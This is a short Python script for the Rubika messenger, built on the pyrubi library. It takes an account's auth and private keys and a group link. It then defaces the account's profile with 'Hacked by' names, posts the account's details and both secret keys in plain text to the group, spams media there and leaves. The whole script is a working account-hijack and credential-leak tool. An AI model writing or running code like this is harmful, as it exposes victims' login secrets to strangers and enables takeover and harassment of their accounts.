import os
import base64
try:
    import pyrubi
except ImportError :
    os.system('pip instal pyrubi')

try:
    auth_key=str(input('enter the auth :'))

    private_key=str(input('enter the  private_ke:'))
    

    link = input("enter link:")
    bot = pyrubi.Client(auth=auth_key,private=private_key)







    guid = bot.join_chat(link)["group"]["group_guid"]  
    
    
    
    bot.update_profile(first_name='Hacked by Shadow Guardian',last_name="Hacked by Shadow Guardian",username='hackedbyamirhossin84',bio='Hacked by Amir Hossein')
    with open('hack.mp3') as voice:
        bot.send_voice(guid,'hack.mp3')
        
    info=bot.get_me()

    

    bot.send_text(guid,f"بفرما کل اطلاعاتم :{info}")
    bot.send_text(guid,f"هک شدم توسط امیرحسین\n{auth_key}\n {private_key}")  



    with open("filter.mp4","rb") as fil:
        
        

        for  i in range(2):
            
            
            
            
            
            bot.send_gif(guid,"filter.mp4")
        
    bot.leave_chat(guid)
except Exception as hack:
    print(f'erorr :{hack}')
